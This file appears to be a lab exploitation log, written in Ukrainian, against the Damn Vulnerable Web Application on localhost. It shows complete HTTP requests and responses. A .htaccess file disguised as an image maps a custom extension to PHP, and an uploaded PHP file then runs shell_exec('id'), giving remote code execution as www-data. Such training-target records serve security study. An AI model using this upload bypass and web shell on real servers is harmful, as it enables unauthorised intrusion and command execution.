@@ -1,0 +1,118 @@
+# V7. .htaccess у каталозі завантажень змінює обробник → RCE
+
+Рівень безпеки DVWA: medium
+
+Результат: ЕКСПЛУАТОВАНО (RGR-V8-1337 id: uid=33(www-data) gid=33(www-data) groups=33(www-data))
+
+
+
+### Завантаження .htaccess
+>>> POST http://127.0.0.1:8081/vulnerabilities/upload/
+>>> Content-Type: multipart/form-data; boundary=89886530896b2e7de84ba8a84774a745
+>>> Cookie: security=medium; PHPSESSID=3a81a56d8e3e64789d9cd41ff709f077
+>>>
+--89886530896b2e7de84ba8a84774a745
+Content-Disposition: form-data; name="Upload"
+
+Upload
+--89886530896b2e7de84ba8a84774a745
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+100000
+--89886530896b2e7de84ba8a84774a745
+Content-Disposition: form-data; name="uploaded"; filename=".htaccess"
+Content-Type: image/png
+
+<FilesMatch "\.rgre329$">
+  SetHandler application/x-httpd-php
+</FilesMatch>
+
+--89886530896b2e7de84ba8a84774a745--
+
+<<< HTTP 200 OK
+<<< Content-Type: text/html;charset=utf-8
+<<< Content-Length: 1494
+<<< (фрагмент тіла; HTML-теги прибрано для читабельності)
+ion
+SQL Injection (Blind)
+Weak Session IDs
+XSS (DOM)
+XSS (Reflected)
+XSS (Stored)
+CSP Bypass
+JavaScript Attacks
+Authorisation Bypass
+Open HTTP Redirect
+Cryptography
+API
+DVWA Security
+PHP Info
+About
+Logout
+	Vulnerability: File Upload
+			Choose an image to upload:
+		../../hackable/uploads/.htaccess succesfully uploaded!
+	More Information
+		https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+		https://www.acunetix.com/websitesecurity/upload-forms-threat/
+				  Username: adminSecurity Level: mediumLocale: enSQLi DB: mysql
+				Damn Vulnerable Web Application (DVWA)
+
+
+### Завантаження файлу .rgre329
+>>> POST http://127.0.0.1:8081/vulnerabilities/upload/
+>>> Content-Type: multipart/form-data; boundary=a857196437c9d4a765ad115df6223a0e
+>>> Cookie: security=medium; PHPSESSID=3a81a56d8e3e64789d9cd41ff709f077
+>>>
+--a857196437c9d4a765ad115df6223a0e
+Content-Disposition: form-data; name="Upload"
+
+Upload
+--a857196437c9d4a765ad115df6223a0e
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+100000
+--a857196437c9d4a765ad115df6223a0e
+Content-Disposition: form-data; name="uploaded"; filename="rgr_v7.rgre329"
+Content-Type: image/png
+
+<?php echo "RGR-V8-" . (7*191) . " id: " . trim((string) shell_exec("id")); ?>
+--a857196437c9d4a765ad115df6223a0e--
+
+<<< HTTP 200 OK
+<<< Content-Type: text/html;charset=utf-8
+<<< Content-Length: 1501
+<<< (фрагмент тіла; HTML-теги прибрано для читабельності)
+QL Injection (Blind)
+Weak Session IDs
+XSS (DOM)
+XSS (Reflected)
+XSS (Stored)
+CSP Bypass
+JavaScript Attacks
+Authorisation Bypass
+Open HTTP Redirect
+Cryptography
+API
+DVWA Security
+PHP Info
+About
+Logout
+	Vulnerability: File Upload
+			Choose an image to upload:
+		../../hackable/uploads/rgr_v7.rgre329 succesfully uploaded!
+	More Information
+		https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+		https://www.acunetix.com/websitesecurity/upload-forms-threat/
+				  Username: adminSecurity Level: mediumLocale: enSQLi DB: mysql
+				Damn Vulnerable Web Application (DVWA)
+
+
+### Виконання
+>>> GET http://127.0.0.1:8081/hackable/uploads/rgr_v7.rgre329
+>>> Cookie: security=medium; PHPSESSID=3a81a56d8e3e64789d9cd41ff709f077
+<<< HTTP 200 OK
+<<< Content-Type: text/html; charset=UTF-8
+<<< Content-Length: 63
+<<< (фрагмент тіла; HTML-теги прибрано для читабельності)
+RGR-V8-1337 id: uid=33(www-data) gid=33(www-data) groups=33(www-data)
